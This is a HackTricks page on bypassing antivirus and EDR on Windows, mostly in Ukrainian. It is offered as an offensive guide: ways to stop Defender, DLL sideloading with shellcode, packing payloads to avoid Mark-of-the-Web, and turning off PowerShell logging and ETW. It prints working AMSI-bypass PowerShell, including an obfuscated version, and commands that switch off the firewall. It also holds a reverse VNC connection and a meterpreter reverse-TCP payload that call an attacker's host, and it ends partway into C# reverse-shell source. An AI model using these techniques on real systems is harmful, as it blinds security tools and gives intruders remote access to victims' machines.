# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку написав(ла)** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для зупинки Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для зупинки Windows Defender шляхом імітації іншого AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Наразі AV використовують різні підходи для перевірки файлу на шкідливість: static detection, dynamic analysis, і для більш просунутих EDR — behavioural analysis.

### **Static detection**

Static detection досягається шляхом позначення відомих шкідливих рядків або масивів байтів у бінарнику чи скрипті, а також вилученням інформації з самого файлу (наприклад, file description, company name, digital signatures, icon, checksum тощо). Це означає, що використання відомих публічних інструментів може призвести до швидшого виявлення, оскільки їх, ймовірно, вже проаналізували і помітили як шкідливі. Є кілька способів обійти такий тип детекції:

- **Encryption**

Якщо ви зашифруєте бінарник, AV не зможе виявити вашу програму, але вам знадобиться якийсь лоадер, щоб розшифрувати і запустити програму в пам'яті.

- **Obfuscation**

Іноді достатньо змінити деякі рядки в бінарнику чи скрипті, щоб пройти повз AV, але це може зайняти багато часу в залежності від того, що саме ви обфускуєте.

- **Custom tooling**

Якщо ви розробите власні інструменти, не буде відомих сигнатур, але це вимагає багато часу і зусиль.

> [!TIP]
> Хороший спосіб перевірити static detection Windows Defender — [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він фактично розбиває файл на кілька сегментів і просить Defender просканувати кожен окремо, таким чином показуючи саме ті рядки або байти, які помічені у вашому бінарнику.

Раджу переглянути цей [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis — це коли AV запускає ваш бінарник у sandbox і спостерігає за шкідливою активністю (наприклад, спроби розшифрувати і прочитати паролі браузера, виконати minidump на LSASS тощо). Ця частина може бути складнішою для обходу, але ось кілька підходів, які допомагають уникнути sandbox-аналізу.

- **Sleep before execution** Залежно від реалізації, це може бути відмінним способом обійти dynamic analysis AV. AV мають дуже обмежений час для сканування файлів, щоб не переривати роботу користувача, тому використання тривалих затримок може порушити аналіз бінарників. Проблема в тому, що багато sandbox просто можуть пропустити sleep залежно від реалізації.
- **Checking machine's resources** Зазвичай Sandboxes мають дуже мало ресурсів (наприклад, < 2GB RAM), інакше вони могли б сповільнювати машину користувача. Тут можна бути креативним, наприклад, перевіряти температуру CPU або швидкість вентиляторів — не все буде емульовано в sandbox.
- **Machine-specific checks** Якщо ви хочете таргетувати користувача, чиї робоча станція приєднана до домену "contoso.local", ви можете перевірити домен комп'ютера і, якщо він не збігається, завершити виконання програми.

Виявилося, що computername Sandbox-а Microsoft Defender — HAL9TH, тож ви можете перевіряти ім'я комп'ютера у вашому malware перед виконанням; якщо ім'я збігається з HAL9TH, це означає, що ви в Defender sandbox, і тоді можна завершити виконання програми.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Декілька інших дуже корисних порад від [@mgeeky](https://twitter.com/mariuszbit) щодо протидії Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev канал</p></figcaption></figure>

Як ми вже казали раніше, **public tools** рано чи пізно **будуть виявлені**, тож вам варто поставити собі питання:

Наприклад, якщо ви хочете дампити LSASS, **чи справді вам потрібно використовувати mimikatz**? Чи можна знайти інший менш відомий проєкт, який також дампить LSASS.

Правильна відповідь, ймовірно, — другий варіант. Взяти mimikatz як приклад: це, ймовірно, один з найпоміченіших AV/EDR інструментів; хоча проєкт дуже корисний, з ним важко працювати для обходу AV, тому просто шукайте альтернативи для досягнення вашої мети.

> [!TIP]
> Коли ви модифікуєте payload-и для обходу, обов'язково **вимкніть автоматичну відправку зразків** у defender, і, будь ласка, серйозно, **DO NOT UPLOAD TO VIRUSTOTAL** якщо ваша мета — довгострокове уникнення виявлення. Якщо ви хочете перевірити, чи виявляє конкретний AV ваш payload, встановіть його на VM, постарайтеся вимкнути автоматичну відправку зразків і тестуйте там, поки не будете задоволені результатом.

## EXEs vs DLLs

Щоразу, коли це можливо, завжди **віддавайте перевагу використанню DLL для evasion** — з мого досвіду, DLL-файли зазвичай **набагато менше детектуються** і аналізуються, тож це простий трюк, щоб уникнути виявлення в деяких випадках (якщо ваш payload має спосіб запускатися як DLL, звичайно).

Як видно на цьому зображенні, DLL Payload від Havoc має показник детекції 4/26 на antiscan.me, тоді як EXE payload має 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me порівняння звичайного Havoc EXE payload проти звичайного Havoc DLL</p></figcaption></figure>

Тепер ми покажемо кілька трюків, які можна використовувати з DLL-файлами, щоб бути значно більш stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який застосовує loader, розташовуючи програму-жертву і шкідливі payload(и) поряд один з одним.

Ви можете перевірити програми, схильні до DLL Sideloading, за допомогою [Siofra](https://github.com/Cybereason/siofra) та наступного powershell-скрипта:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ця команда виведе список програм, вразливих до DLL hijacking всередині "C:\Program Files\\" та DLL files, які вони намагаються завантажити.

Я настійно рекомендую вам **особисто дослідити DLL Hijackable/Sideloadable programs**, ця техніка досить прихована при правильному виконанні, але якщо ви використовуєте публічно відомі DLL Sideloadable programs, вас можуть легко виявити.

Просто розмістивши шкідливий DLL з іменем, яке програма очікує завантажити, не призведе до запуску вашого payload, оскільки програма очікує наявності певних функцій у цьому DLL; щоб вирішити цю проблему, ми використаємо іншу техніку під назвою **DLL Proxying/Forwarding**.

**DLL Proxying** перенаправляє виклики, які програма робить, з proxy (і шкідливого) DLL до оригінального DLL, зберігаючи функціональність програми і дозволяючи обробляти виконання вашого payload.

Я буду використовувати проект [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/)

Ось кроки, які я виконав:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Остання команда дасть нам 2 файли: шаблон вихідного коду DLL та оригінальну перейменовану DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn)) і proxy DLL мають показник виявлення 0/26 на [antiscan.me](https://antiscan.me)! Я вважаю це успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Я **рішуче рекомендую** переглянути [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб детальніше ознайомитися з темою.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Ви можете використовувати Freeze для завантаження та виконання вашого shellcode приховано.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion — це проста гра в кішки-мишки: те, що працює сьогодні, може бути виявлено завтра, тому ніколи не покладайтеся лише на один інструмент; за можливості спробуйте поєднувати кілька evasion techniques.

## AMSI (Anti-Malware Scan Interface)

AMSI створено для запобігання "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Початково AVs могли сканувати лише **файли на диску**, тож якщо вам вдавалося якось виконати payloads **безпосередньо в пам'яті**, AV не міг нічого вдіяти, бо не мав достатньої видимості.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (підвищення прав для EXE, COM, MSI або встановлення ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічна оцінка коду)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

It allows antivirus solutions to inspect script behavior by exposing script contents in a form that is both unencrypted and unobfuscated.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Notice how it prepends `amsi:` and then the path to the executable from which the script ran, in this case, powershell.exe

We didn't drop any file to disk, but still got caught in-memory because of AMSI.

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Оскільки AMSI в основному працює зі статичним виявленням, модифікація скриптів, які ви намагаєтесь завантажити, може бути хорошим способом уникнути виявлення.

Однак AMSI може знімати обфускацію зі скриптів навіть якщо її кілька шарів, тому обфускація може виявитись поганим варіантом залежно від способу її виконання. Це ускладнює обходи. Хоча іноді достатньо змінити кілька імен змінних, і все буде гаразд, тож усе залежить від того, наскільки сильно щось було помічено.

- **AMSI Bypass**

Оскільки AMSI реалізовано шляхом завантаження DLL у процес powershell (також cscript.exe, wscript.exe тощо), з ним можна легко маніпулювати навіть при виконанні від імені користувача без підвищених привілеїв. Через цю помилку в реалізації AMSI дослідники знайшли кілька способів обійти сканування AMSI.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Всього лиш один рядок коду powershell зробив AMSI непридатним для поточного процесу powershell. Цей рядок, звісно, був помічений самим AMSI, тож для використання цієї техніки потрібні деякі модифікації.

Ось змінений AMSI bypass, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Майте на увазі, що це, ймовірно, буде помічено після публікації цього допису, тому не слід публікувати код, якщо ваша мета — залишатися непоміченим.

**Memory Patching**

Цю техніку спочатку виявив [@RastaMouse](https://twitter.com/_RastaMouse/), і вона полягає у пошуку адреси функції "AmsiScanBuffer" в amsi.dll (відповідальної за сканування введених користувачем даних) та перезаписі її інструкціями, які повертають код E_INVALIDARG; таким чином результат фактичного сканування поверне 0, що інтерпретується як чистий результат.

> [!TIP]
> Будь ласка, прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) для детальнішого пояснення.

Існує також багато інших технік обходу AMSI за допомогою powershell — перегляньте [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) та [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), щоб дізнатися про них більше.

Цей інструмент [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) також генерує скрипт для обходу AMSI.

**Remove the detected signature**

Ви можете використати інструмент, такий як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** та **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, щоб видалити виявлений AMSI-підпис з пам'яті поточного процесу. Цей інструмент працює шляхом сканування пам'яті поточного процесу в пошуках AMSI-підпису і перезапису його інструкціями NOP, фактично видаляючи його з пам'яті.

**AV/EDR products that uses AMSI**

Ви можете знайти список AV/EDR-продуктів, що використовують AMSI, у **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Якщо ви використовуєте PowerShell версії 2, AMSI не буде завантажено, тому ви зможете запускати свої скрипти без їх сканування AMSI. Ви можете зробити так:
```bash
powershell.exe -version 2
```
## PS логування

PowerShell logging — це функція, що дозволяє логувати всі PowerShell команди, виконані в системі. Це корисно для аудиту та усунення неполадок, але також може стати проблемою для атакуючих, які хочуть уникнути виявлення.

Щоб обійти логування PowerShell, можна використати такі техніки:

- **Вимкнути PowerShell Transcription та Module Logging**: для цього можна використовувати інструмент такий як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: якщо використовувати PowerShell версії 2, AMSI не буде завантажено, тож можна запускати скрипти без сканування AMSI. Можна зробити так: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: використайте [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) щоб створити PowerShell без захисту (це те, що використовує `powerpick` з Cobal Strike).


## Обфускація

> [!TIP]
> Декілька технік обфускації використовують шифрування даних, що підвищує ентропію бінарника і робить його легшим для виявлення AVs та EDRs. Будьте обережні з цим і, можливо, застосовуйте шифрування лише до конкретних секцій коду, які є чутливими або потребують приховування.

### Деобфускація .NET бінарів, захищених ConfuserEx

При аналізі malware, що використовує ConfuserEx 2 (або комерційні форки), часто стикаються з кількома шарами захисту, які блокують decompilers і sandboxes. Наведений нижче робочий процес надійно відновлює близький до оригіналу IL, який потім можна задекомпілювати в C# за допомогою dnSpy або ILSpy.

1.  Anti-tampering removal – ConfuserEx шифрує кожне *method body* і дешифрує його всередині статичного конструктора модуля (`<Module>.cctor`). Це також патчить PE checksum так, що будь-яка модифікація може викликати падіння бінарника. Використайте **AntiTamperKiller** щоб знайти зашифровані метадані таблиці, відновити XOR ключі і переписати чисту збірку:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Вивід містить 6 anti-tamper параметрів (`key0-key3`, `nameHash`, `internKey`), які можуть бути корисні при побудові власного unpacker'а.

2.  Symbol / control-flow recovery – подайте *clean* файл в **de4dot-cex** (форк de4dot з підтримкою ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Параметри:
• `-p crx` – вибрати ConfuserEx 2 профіль  
• de4dot розверне control-flow flattening, відновить оригінальні простори імен, класи та імена змінних і дешифрує константні рядки.

3.  Proxy-call stripping – ConfuserEx замінює прямі виклики методів на легковісні обгортки (так звані *proxy calls*) щоб ускладнити декомпіляцію. Видаліть їх за допомогою **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Після цього кроку ви повинні побачити звичні .NET API такі як `Convert.FromBase64String` або `AES.Create()` замість непрозорих wrapper-функцій (`Class8.smethod_10`, …).

4.  Manual clean-up – запустіть отриманий бінар під dnSpy, шукайте великі Base64 бінарні блоки або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб знайти *справжній* payload. Часто malware зберігає його як TLV-кодований масив байтів, ініціалізований усередині `<Module>.byte_0`.

Вищезгаданий ланцюжок відновлює execution flow **без** потреби запускати зразок — корисно при роботі на офлайн робочій станції.

> 🛈  ConfuserEx додає кастомний атрибут з ім'ям `ConfusedByAttribute`, який можна використовувати як IOC для автоматичної триажі зразків.

#### Однорядковий приклад
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Метою цього проєкту є надати open-source форк [LLVM](http://www.llvm.org/) compilation suite, здатний підвищити безпеку програмного забезпечення через [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) та tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати `C++11/14` для генерації на етапі компіляції obfuscated code без використання зовнішніх інструментів та без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар obfuscated operations, згенерованих C++ template metaprogramming framework, що ускладнить життя тому, хто хоче crack the application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is a x64 binary obfuscator that is able to obfuscate various different pe files including: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — простий metamorphic code engine для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is a fine-grained code obfuscation framework for LLVM-supported languages using ROP (return-oriented programming). ROPfuscator obfuscates a program at the assembly code level by transforming regular instructions into ROP chains, thwarting our natural conception of normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is a .NET PE Crypter written in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor is able to convert existing EXE/DLL into shellcode and then load them

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка Zone.Identifier ADS для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що виконувані файли, підписані **довіреним** сертифікатом підпису, **не викликають спрацьовування SmartScreen**.

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ось демонстрація обходу SmartScreen шляхом упакування payloads всередину ISO файлів за допомогою [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм логування у Windows, який дозволяє додаткам та системним компонентам **реєструвати події**. Однак його також можуть використовувати продукти безпеки для моніторингу та виявлення шкідливої активності.

Аналогічно до того, як AMSI відключається (обходиться), також можна змусити функцію користувацького простору **`EtwEventWrite`** повертатися негайно без запису будь-яких подій. Це робиться шляхом патчу функції в пам'яті, щоб вона повертала управління одразу, фактично відключаючи ETW-логування для цього процесу.

Детальніше дивіться в **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Завантаження C# бінарників у пам'ять відоме вже давно і досі є чудовим способом запуску post-exploitation інструментів без залишання слідів на диску та без виявлення AV.

Оскільки payload буде завантажено безпосередньо в пам'ять без запису на диск, нам потрібно лише подбати про патчинг AMSI для всього процесу.

Більшість C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, тощо) вже надають можливість виконувати C# assemblies безпосередньо в пам'яті, але існують різні способи це робити:

- **Fork\&Run**

Це передбачає **створення нового sacrificial процесу**, інжекцію вашого post-exploitation шкідливого коду в цей новий процес, виконання коду та після завершення — завершення нового процесу. Це має як переваги, так і недоліки. Перевага методу fork and run в тому, що виконання відбувається **поза** нашим Beacon implant процесом. Це означає, що якщо щось піде не так або буде виявлено в ході post-exploitation дії, існує **набагато більша ймовірність**, що наш **implant виживе.** Недолік в тому, що у вас є **більша ймовірність** бути виявленим за допомогою **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Це стосується інжекції post-exploitation шкідливого коду **в власний процес**. Таким чином можна уникнути створення нового процесу та його сканування AV, але недолік в тому, що якщо щось піде не так під час виконання вашого payload, існує **набагато більша ймовірність** **втрати Beacon**, оскільки процес може впасти.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Якщо ви хочете дізнатися більше про завантаження C# Assembly, перегляньте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та їх InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Ви також можете завантажувати C# Assemblies **з PowerShell**, подивіться на [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) та відео S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Using Other Programming Languages

Як пропонується в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можливо виконувати шкідливий код з інших мов, надаючи скомпрометованій машині доступ **до середовища інтерпретатора, встановленого на Attacker Controlled SMB share**.

Дозволяючи доступ до бінарників інтерпретатора та середовища на SMB share, ви можете **виконувати довільний код цими мовами в пам'яті** скомпрометованої машини.

Репозиторій вказує: Defender все ще сканує скрипти, але використовуючи Go, Java, PHP тощо ми отримуємо **більшу гнучкість для обходу статичних сигнатур**. Тестування з випадковими необфусцированими reverse shell скриптами на цих мовах показало успішні результати.

## TokenStomping

Token stomping — це техніка, яка дозволяє нападнику **маніпулювати access token або продуктом безпеки**, наприклад EDR чи AV, зменшуючи його привілеї так, що процес не завершиться, але в нього не буде дозволів перевіряти шкідливу активність.

Щоб запобігти цьому, Windows могла б **заборонити зовнішнім процесам** отримувати handles на токени процесів безпеки.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Як описано в [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), досить просто встановити Chrome Remote Desktop на ПК жертви, після чого використовувати його для доступу та підтримки стійкого доступу:
1. Завантажте з https://remotedesktop.google.com/, натисніть "Set up via SSH", а потім натисніть на MSI-файл для Windows, щоб завантажити MSI.
2. Запустіть інсталятор тихо на машині жертви (потрібні права адміністратора): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть далі. Майстер попросить авторизацію; натисніть кнопку Authorize, щоб продовжити.
4. Виконайте наданий параметр із деякими коригуваннями: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Зверніть увагу на параметр pin, який дозволяє задати PIN без використання GUI).

## Advanced Evasion

Evasion — дуже складна тема; іноді потрібно враховувати багато різних джерел телеметрії в одній системі, тому практично неможливо залишатися повністю непоміченим у зрілих середовищах.

Кожне середовище, з яким ви стикаєтеся, має свої сильні й слабкі сторони.

Я дуже рекомендую переглянути цю доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати уявлення про більш просунуті техніки Evasion.

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це також чудова доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про Evasion in Depth.

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Ви можете використати [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який буде **видаляти частини бінарника**, поки **не з'ясує, яку саме частину Defender** позначає як шкідливу, і підкаже вам.\
Ще один інструмент, що робить **те саме**, — [**avred**](https://github.com/dobin/avred) з відкритим веб-сервісом за адресою [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows10 усі версії Windows постачалися з можливістю встановлення **Telnet server**, який ви могли встановити (як адміністратор), виконавши:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Зробіть так, щоб він **запускався** при завантаженні системи та **запустіть** його зараз:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Змінити telnet port** (stealth) і вимкнути firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (потрібні bin-завантаження, не інсталятор)

**ON THE HOST**: Запустіть _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть опцію _Disable TrayIcon_
- Встановіть пароль у _VNC Password_
- Встановіть пароль у _View-Only Password_

Потім помістіть бінарний файл _**winvnc.exe**_ та **щойно** створений файл _**UltraVNC.ini**_ у **victim**

#### **Reverse connection**

**attacker** має на своєму **host** запустити бінарний файл `vncviewer.exe -listen 5900`, щоб він був **prepared** прийняти reverse **VNC connection**. Потім, всередині **victim**: запустіть демон winvnc `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

УВАГА: Щоб зберегти прихованість, не робіть кілька речей

- Не запускайте `winvnc`, якщо він вже запущений, інакше ви викличете [popup](https://i.imgur.com/1SROTTl.png). Перевірте, чи працює він за допомогою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` у тій же директорії, інакше відкриється [the config window](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` за довідкою, інакше ви викличете [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Всередині GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Тепер **запустіть lister** командою `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Поточний Defender дуже швидко завершить процес.**

### Компіляція власного reverse shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його за допомогою:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Використовуйте це з:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
